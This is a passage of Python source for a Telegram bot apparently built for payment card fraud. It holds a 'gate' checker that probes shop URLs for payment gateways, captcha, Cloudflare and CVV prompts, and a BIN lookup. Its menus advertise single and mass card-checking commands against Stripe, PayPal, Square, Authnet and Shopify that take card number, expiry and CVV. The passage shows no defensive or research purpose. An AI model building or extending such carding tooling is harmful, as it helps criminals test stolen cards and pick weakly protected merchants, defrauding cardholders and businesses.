        system = "WooCommerce" if "woocommerce" in response.text.lower() else (
                 "Shopify" if "shopify" in response.text.lower() else "Not Detected")

        return {
            "url": url,
            "status": "success",
            "status_code": response.status_code,
            "payment_gateways": detected_gateways or ["None Detected"],
            "captcha": captcha_type,
            "cloudflare": cloudflare_status,
            "security": secure_type,
            "cvv_cvc_status": "Requested" if cvv_present else "Unknown",
            "inbuilt_system": system
        }

    except requests.exceptions.HTTPError as http_err:
        return {
            "error": f"HTTP Error: {str(http_err)}",
            "status": "failed",
            "status_code": 500
        }
    except requests.exceptions.RequestException as req_err:
        return {
            "error": f"Request Error: {str(req_err)}",
            "status": "failed",
            "status_code": 500
        }
    except Exception as e:
        return {
            "error": f"Unexpected error: {str(e)}",
            "status": "failed",
            "status_code": 500
        }

def format_gate_result(result, mention, user_status, time_taken):
    if result.get('status') == 'failed':
        return f"""
<a href='https://t.me/voidboy336'>┏━━━━━━━⍟</a>
<a href='https://t.me/voidboy336'>┃ 𝐋𝐨𝐨𝐤𝐮𝐩 𝐑𝐞𝐬𝐮𝐥𝐭 ❌</a>
<a href='https://t.me/voidboy336'>┗━━━━━━━━━━━⊛</a>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐄𝐫𝐫𝐨𝐫 ➳ <code>{result.get('error', 'Unknown error')}</code>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 𝐂𝐨𝐝𝐞 ➳ <i>{result.get('status_code', 'N/A')}</i>
<a href='https://t.me/voidboy336'>──────── ⸙ ─────────</a>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {mention} [ {user_status} ]
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐃𝐞𝐯 ⌁ ⏤‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲
<a href='https://t.me/voidboy336'>[⸙]</a> 𝗧𝗶𝗺𝗲 ⌁ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

    payment_gateways = ", ".join(result.get('payment_gateways', []))
    captcha_types = ", ".join(result.get('captcha', []))

    return f"""
<a href='https://t.me/voidboy336'>┏━━━━━━━⍟</a>
<a href='https://t.me/voidboy336'>┃ 𝐋𝐨𝐨𝐤𝐮𝐩 𝐑𝐞𝐬𝐮𝐥𝐭 ✅</a>
<a href='https://t.me/voidboy336'>┗━━━━━━━━━━━⊛</a>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐒𝐢𝐭𝐞 ➳ <code>{result.get('url', 'N/A')}</code>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐏𝐚𝐲𝐦𝐞𝐧𝐭 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬 ➳ <i>{payment_gateways}</i>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐂𝐚𝐩𝐭𝐜𝐡𝐚 ➳ <i>{captcha_types}</i>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐂𝐥𝐨𝐮𝐝𝐟𝐥𝐚𝐫𝐞 ➳ <i>{result.get('cloudflare', 'Unknown')}</i>
<a href='https://t.me/voidboy336'>──────── ⸙ ─────────</a>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 ➳ <i>{result.get('security', 'Unknown')}</i>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐂𝐕𝐕/𝐂𝐕𝐂 ➳ <i>{result.get('cvv_cvc_status', 'Unknown')}</i>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐈𝐧𝐛𝐮𝐢𝐥𝐭 𝐒𝐲𝐬𝐭𝐞𝐦 ➳ <i>{result.get('inbuilt_system', 'Unknown')}</i>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐒𝐭𝐚𝐭𝐮𝐬 ➳ <i>{result.get('status_code', 'N/A')}</i>
<a href='https://t.me/voidboy336'>──────── ⸙ ─────────</a>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {mention} [ {user_status} ]
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐃𝐞𝐯 ⌁ ⏤‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲
<a href='https://t.me/voidboy336'>[⸙]</a> 𝗧𝗢𝗧𝗔𝗟 𝗧𝗜𝗠𝗘 ⌁ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

@bot.message_handler(commands=['gate'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.gate'))
def handle_gate(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide a URL to check. Example: /gate https://example.com")
        return

    url = command_parts[1]
    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"

    processing_msg = f"<a href='https://t.me/voidboy336'>🔍 Checking URL: {url}</a>"
    status_message = bot.reply_to(message, processing_msg, parse_mode='HTML')

    start_time = time.time()
    result = check_gate_url(url)
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = format_gate_result(result, mention, user_status, time_taken)
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

def format_bin_result(bin_info, bin_number, mention, user_status, time_taken):
    if not bin_info:
        return f"""
<a href='https://t.me/voidboy336'>┏━━━━━━━⍟</a>
<a href='https://t.me/voidboy336'>┃ 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨 ❌</a>
<a href='https://t.me/voidboy336'>┗━━━━━━━━━━━⊛</a>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐄𝐫𝐫𝐨𝐫 ➳ <code>No information found for BIN: {bin_number}</code>
<a href='https://t.me/voidboy336'>──────── ⸙ ─────────</a>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {mention} [ {user_status} ]
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐃𝐞𝐯 ⌁ ⏤‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲
<a href='https://t.me/voidboy336'>[⸙]</a> 𝗧𝗶𝗺𝗲 ⌁ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

    bank = bin_info.get('bank', 'None')
    brand = bin_info.get('brand', 'None')
    card_type = bin_info.get('type', 'None')
    country = bin_info.get('country', 'None')
    country_flag = bin_info.get('country_flag', '')
    level = bin_info.get('level', 'None')

    return f"""
<a href='https://t.me/voidboy336'>┏━━━━━━━⍟</a>
<a href='https://t.me/voidboy336'>┃ 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</a>
<a href='https://t.me/voidboy336'>┗━━━━━━━━━━━⊛</a>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐁𝐈𝐍 ➳ <code>{bin_number}</code>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐁𝐚𝐧𝐤 ➳ {bank}
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐁𝐫𝐚𝐧𝐝 ➳ {brand}
<a href='https://t.me/voidboy336'>──────── ⸙ ─────────</a>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐓𝐲𝐩𝐞 ➳ {card_type}
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➳ {country} {country_flag}
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐋𝐞𝐯𝐞𝐥 ➳ {level}
<a href='https://t.me/voidboy336'>──────── ⸙ ─────────</a>
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {mention} [ {user_status} ]
<a href='https://t.me/voidboy336'>[⸙]</a> 𝐃𝐞𝐯 ⌁ ⏤‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲
<a href='https://t.me/voidboy336'>[⸙]</a> 𝗧𝗶𝗺𝗲 ⌁ {time_taken} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""

@bot.message_handler(commands=['bin'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.bin'))
def handle_bin(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide a BIN number. Example: /bin 524534 or .bin 52453444|02|2026")
        return

    input_text = command_parts[1]
    bin_number = ""
    for char in input_text:
        if char.isdigit():
            bin_number += char
            if len(bin_number) >= 8:
                break
        elif char == '|':
            break

    if len(bin_number) < 6:
        bot.reply_to(message, "Please provide a valid BIN with at least 6 digits. Example: /bin 524534 or .bin 52453444|02|2026")
        return

    bin_number = bin_number[:8]
    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"

    processing_msg = f"<a href='https://t.me/voidboy336'>🔍 Checking BIN: {bin_number}</a>"
    status_message = bot.reply_to(message, processing_msg, parse_mode='HTML')

    start_time = time.time()
    bin_info = get_bin_info(bin_number) or {}
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    response_text = format_bin_result(bin_info, bin_number, mention, user_status, time_taken)
    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

@bot.message_handler(commands=['start'])
def handle_start(message):
    # --- hard guard: don't process this update twice for the same chat ---
    if not hasattr(bot, "user_data"):
        bot.user_data = {}
    last = bot.user_data.get(message.chat.id, {})
    if last.get("last_update_id") == message.message_id:
        return  # already handled
    bot.user_data[message.chat.id] = {"last_update_id": message.message_id}

    save_users(message.from_user.id)

    user = message.from_user
    mention = f"<a href='tg://user?id={user.id}'>{user.first_name}</a>"
    username = f"@{user.username}" if user.username else "None"
    join_date_formatted = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(message.date))
    credits = "0"

    caption = f"""
↯ sᴛᴏʀᴍ x

<a href='https://t.me/voidboy336'>[⸙]</a> ғᴜʟʟ ɴᴀᴍᴇ ⌁ {mention}
<a href='https://t.me/voidboy336'>[⸙]</a> ᴊᴏɪɴ ᴅᴀᴛᴇ ⌁ {join_date_formatted}
<a href='https://t.me/voidboy336'>[⸙]</a> ᴄʜᴀᴛ ɪᴅ ⌁ <code>{user.id}</code>
<a href='https://t.me/voidboy336'>[⸙]</a> ᴜsᴇʀɴᴀᴍᴇ ⌁ <i>{username}</i>
<a href='https://t.me/voidboy336'>[⸙]</a> ᴄʀᴇᴅɪᴛs ⌁ {credits}

↯ ᴜsᴇ ᴛʜᴇ ʙᴇʟᴏᴡ ʙᴜᴛᴛᴏɴs ᴛᴏ ɢᴇᴛ sᴛᴀʀᴛᴇᴅ
"""

    # keyboard
    markup = telebot.types.InlineKeyboardMarkup()
    btn1 = telebot.types.InlineKeyboardButton("🔍 Gateways", callback_data="gateways")
    btn2 = telebot.types.InlineKeyboardButton("🛠️ Tools", callback_data="tools")
    btn3 = telebot.types.InlineKeyboardButton("❓ Help", callback_data="help")
    btn4 = telebot.types.InlineKeyboardButton("👤 My Info", callback_data="myinfo")
    btn5 = telebot.types.InlineKeyboardButton("📢 Channel", url="https://t.me/voidboy336")
    markup.row(btn1, btn2)
    markup.row(btn3, btn4)
    markup.row(btn5)

    # --- send exactly one message ---
    try:
        # First try to send as video
        msg = bot.send_video(
            chat_id=message.chat.id,
            video="https://t.me/backyXchannel/48",  # Use 'video' parameter, not 'data'
            caption=caption,
            parse_mode="HTML",
            reply_markup=markup
        )
    except Exception as e:
        print(f"Video send failed: {e}")
        try:
            # Fallback: send as document
            msg = bot.send_document(
                chat_id=message.chat.id,
                document="https://t.me/backyXchannel/48",
                caption=caption,
                parse_mode="HTML",
                reply_markup=markup
            )
        except Exception as e:
            print(f"Document send failed: {e}")
            try:
                # Fallback: send as photo with different image
                msg = bot.send_photo(
                    chat_id=message.chat.id,
                    photo="https://img.icons8.com/fluency/96/000000/telegram-app.png",
                    caption=caption,
                    parse_mode="HTML",
                    reply_markup=markup
                )
            except Exception as e:
                print(f"Photo send failed: {e}")
                # Final fallback: send as text only
                msg = bot.send_message(
                    chat_id=message.chat.id,
                    text=caption + "\n\n🎥 Video preview unavailable",
                    parse_mode="HTML",
                    reply_markup=markup,
                    disable_web_page_preview=True
                )

    # store welcome message id (optional)
    bot.user_data[message.chat.id]["welcome_msg_id"] = msg.message_id

# Add callback handler for the buttons
@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    user = call.from_user
    mention = f"<a href='tg://user?id={user.id}'>{user.first_name}</a>"
    username = f"@{user.username}" if user.username else "None"
    credits = "0"  # Default credits
    
    if call.data == "gateways":
        # Create markup with back button
        markup = telebot.types.InlineKeyboardMarkup()
        btn_back = telebot.types.InlineKeyboardButton("🔙 Back", callback_data="back_to_main")
        markup.row(btn_back)
        
        gateways_text = f"""
🔍 <b>Gateways Available:</b>

<a href='https://t.me/voidboy336'>[⸙]</a> <code>.chk</code> - Stripe Auth 2th
<a href='https://t.me/voidboy336'>[⸙]</a> <code>.vbv</code> - 3DS Lookup
<a href='https://t.me/voidboy336'>[⸙]</a> <code>.py</code> - Paypal [0.1$]
<a href='https://t.me/voidboy336'>[⸙]</a> <code>.qq</code> - Stripe Square [0.20$]
<a href='https://t.me/voidboy336'>[⸙]</a> <code>.cc</code> - Site Based [1$]
<a href='https://t.me/voidboy336'>[⸙]</a> <code>.sh</code> - Self Shopify [Custom]

📊 <b>Mass Check Commands:</b>
<code>.mchk</code> <code>.mvbv</code> <code>.mpy</code> 
<code>.mqq</code> <code>.mcc</code> <code>.msh</code>

ᴜsᴇ ᴛʜᴇ ʙᴜᴛᴛᴏɴs ʙᴇʟᴏᴡ ᴛᴏ ɴᴀᴠɪɢᴀᴛᴇ
"""
        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=gateways_text,
                parse_mode='HTML',
                reply_markup=markup
            )
        except Exception as e:
            print(f"Error editing gateways: {e}")
        bot.answer_callback_query(call.id, "Gateways information displayed")
    
    elif call.data == "tools":
        # Create markup with back button
        markup = telebot.types.InlineKeyboardMarkup()
        btn_back = telebot.types.InlineKeyboardButton("🔙 Back", callback_data="back_to_main")
        markup.row(btn_back)
        
        tools_text = f"""
🛠️ <b>Available Tools:</b>

<a href='https://t.me/voidboy336'>[⸙]</a> <code>.gate</code> URL - Gate Checker
• Check payment gateways, captcha, and security

<a href='https://t.me/voidboy336'>[⸙]</a> <code>.bin</code> BIN - BIN Lookup  
• Get detailed BIN information

<a href='https://t.me/voidboy336'>[⸙]</a> <code>.au</code> - Stripe Auth 2
<a href='https://t.me/voidboy336'>[⸙]</a> <code>.at</code> - Authnet [5$]

ᴜsᴇ ᴛʜᴇ ʙᴜᴛᴛᴏɴs ʙᴇʟᴏᴡ ᴛᴏ ɴᴀᴠɪɢᴀᴛᴇ
"""
        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=tools_text,
                parse_mode='HTML',
                reply_markup=markup
            )
        except Exception as e:
            print(f"Error editing tools: {e}")
        bot.answer_callback_query(call.id, "Tools information displayed")
    
    elif call.data == "help":
        # Create markup with back button
        markup = telebot.types.InlineKeyboardMarkup()
        btn_back = telebot.types.InlineKeyboardButton("🔙 Back", callback_data="back_to_main")
        markup.row(btn_back)
        
        help_text = f"""
❓ <b>Help & Support</b>

<a href='https://t.me/voidboy336'>[⸙]</a> <b>How to use:</b>
• Use commands like <code>.chk CC|MM|YY|CVV</code>
• For mass check, reply to message with cards using <code>.mchk</code>
• Set Shopify site with <code>/seturl your-store.com</code>

<a href='https://t.me/voidboy336'>[⸙]</a> <b>Support:</b>
• Channel: @backyXchannel
• Contact for help and credits

<a href='https://t.me/voidboy336'>[⸙]</a> <b>Note:</b>
• Always use valid card formats
• Results may vary by gateway

ᴜsᴇ ᴛʜᴇ ʙᴜᴛᴛᴏɴs ʙᴇʟᴏᴡ ᴛᴏ ɴᴀᴠɪɢᴀᴛᴇ
"""
        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=help_text,
                parse_mode='HTML',
                reply_markup=markup
            )
        except Exception as e:
            print(f"Error editing help: {e}")
        bot.answer_callback_query(call.id, "Help information displayed")
    
    elif call.data == "myinfo":
        # Create markup with back button
        markup = telebot.types.InlineKeyboardMarkup()
        btn_back = telebot.types.InlineKeyboardButton("🔙 Back", callback_data="back_to_main")
        markup.row(btn_back)
        
        myinfo_text = f"""
👤 <b>Your Information:</b>

<a href='https://t.me/voidboy336'>[⸙]</a> ғᴜʟʟ ɴᴀᴍᴇ ⌁ {mention}
<a href='https://t.me/voidboy336'>[⸙]</a> ᴜsᴇʀ ɪᴅ ⌁ <code>{user.id}</code>
<a href='https://t.me/voidboy336'>[⸙]</a> ᴜsᴇʀɴᴀᴍᴇ ⌁ <i>{username}</i>
<a href='https://t.me/voidboy336'>[⸙]</a> ᴄʀᴇᴅɪᴛs ⌁ {credits}

📊 <b>Usage Statistics:</b>
<a href='https://t.me/voidboy336'>[⸙]</a> ᴛᴏᴛᴀʟ ᴄʜᴇᴄᴋs ⌁ 0
<a href='https://t.me/voidboy336'>[⸙]</a> ᴀᴘᴘʀᴏᴠᴇᴛ ⌁ 0
<a href='https://t.me/voidboy336'>[⸙]</a> ᴅᴇᴄʟɪɴᴇᴅ ⌁ 0

ᴜsᴇ ᴛʜᴇ ʙᴜᴛᴛᴏɴs ʙᴇʟᴏᴡ ᴛᴏ ɴᴀᴠɪɢᴀᴛᴇ
"""
        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=myinfo_text,
                parse_mode='HTML',
                reply_markup=markup
            )
        except Exception as e:
            print(f"Error editing myinfo: {e}")
        bot.answer_callback_query(call.id, "Your information displayed")
    
    elif call.data == "back_to_main":
        # Return to main welcome screen with original buttons
        join_date_formatted = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(call.message.date))
        main_text = f"""
↯ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴠᴏɪᴅ x

<a href='https://t.me/voidboy336'>[⸙]</a> ғᴜʟʟ ɴᴀᴍᴇ ⌁ {mention}
<a href='https://t.me/backyXchannel'>[⸙]</a> ᴊᴏɪɴ ᴅᴀᴛᴇ ⌁ {join_date_formatted}
<a href='https://t.me/backyXchannel'>[⸙]</a> ᴄʜᴀᴛ ɪᴅ ⌁ <code>{user.id}</code>
<a href='https://t.me/backyXchannel'>[⸙]</a> ᴜsᴇʀɴᴀᴍᴇ ⌁ <i>{username}</i>
<a href='https://t.me/backyXchannel'>[⸙]</a> ᴄʀᴇᴅɪᴛs ⌁ {credits}

↯ ᴜsᴇ ᴛʜᴇ ʙᴇʟᴏᴡ ʙᴜᴛᴛᴏɴs ᴛᴏ ɢᴇᴛ sᴛᴀʀᴛᴇᴅ
"""
        # Recreate original buttons
        markup = telebot.types.InlineKeyboardMarkup()
        btn1 = telebot.types.InlineKeyboardButton("🔍 Gateways", callback_data="gateways")
        btn2 = telebot.types.InlineKeyboardButton("🛠️ Tools", callback_data="tools")
        btn3 = telebot.types.InlineKeyboardButton("❓ Help", callback_data="help")
        btn4 = telebot.types.InlineKeyboardButton("👤 My Info", callback_data="myinfo")
        btn5 = telebot.types.InlineKeyboardButton("📢 Channel", url="https://t.me/backyXchannel")
        markup.row(btn1, btn2)
        markup.row(btn3, btn4)
        markup.row(btn5)
        
        try:
            bot.edit_message_caption(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                caption=main_text,
                parse_mode='HTML',
                reply_markup=markup
            )
        except Exception as e:
            print(f"Error editing back to main: {e}")
        bot.answer_callback_query(call.id, "Returned to main menu")

# Run the bot
if __name__ == "__main__":
    print("Bot is running...")
    bot.infinity_polling()
